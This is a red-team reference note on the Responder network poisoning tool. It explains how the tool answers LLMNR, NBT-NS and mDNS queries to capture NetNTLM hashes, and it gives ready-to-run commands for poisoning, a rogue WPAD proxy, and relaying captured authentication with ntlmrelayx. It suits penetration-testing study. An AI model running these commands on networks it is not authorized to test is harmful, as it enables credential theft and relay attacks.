---
title: Responder
aliases: ["Responder", "Responder.py", "Laurent Gaffie"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Laurent Gaffie (lgandx)"
source_url: "https://github.com/lgandx/Responder"
verified: true
related: ["[[LLMNR-NBT-NS Poisoning]]", "[[WPAD and IPv6 (mitm6) Poisoning]]", "[[NTLM Relay]]", "[[NetNTLM]]", "[[ntlmrelayx]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Responder

> [!summary] One-liner
> A network poisoner and credential capture tool — responds to LLMNR, NBT-NS, and mDNS queries to capture [[NetNTLM]] hashes from victims attempting name resolution on the local network.

## What it does
1. Listens for broadcast/multicast name resolution queries ([[LLMNR-NBT-NS Poisoning|LLMNR, NBT-NS]], mDNS).
2. Responds to all queries claiming to be the requested host.
3. Victims connect to Responder's rogue services (SMB, HTTP, WPAD, FTP, etc.).
4. Responder captures the [[NetNTLM]] challenge-response hash.
5. Hashes are saved to logs for offline cracking.

## Usage
```bash
# Basic poisoning (LLMNR + NBT-NS + mDNS)
sudo responder -I eth0

# With WPAD (captures HTTP NTLM auth via proxy)
sudo responder -I eth0 -wFb

# Analyze mode (listen only, no poisoning — passive recon)
sudo responder -I eth0 -A

# Disable specific services (e.g., when relaying instead of capturing)
sudo responder -I eth0 --disable-ess
```

## Key flags

| Flag | Purpose |
|---|---|
| `-I` | Network interface |
| `-w` | Enable WPAD rogue proxy |
| `-F` | Force WPAD auth |
| `-b` | HTTP basic auth (plaintext) instead of NTLM |
| `-A` | Analyze mode (passive, no poisoning) |
| `-v` | Verbose output |

## Output
- Hashes saved to `/opt/Responder/logs/` (or `./logs/`).
- Format: `<USER>::<DOMAIN>:<challenge>:<NTLMv2_response>` (ready for hashcat -m 5600).

## Pairing with relay (instead of cracking)
When relaying, disable Responder's SMB/HTTP servers so [[ntlmrelayx]] can listen instead:
```bash
# Edit Responder.conf: set SMB = Off, HTTP = Off
sudo responder -I eth0

# In another terminal
ntlmrelayx.py -t smb://<TARGET> -smb2support
```

## Related
- Poisoning mechanics: [[LLMNR-NBT-NS Poisoning]], [[WPAD and IPv6 (mitm6) Poisoning]].
- Captured hashes: [[NetNTLM]], [[NTLM Cracking]].
- Relay instead of crack: [[ntlmrelayx]], [[NTLM Relay]].
- Windows alternative: [[Inveigh]].
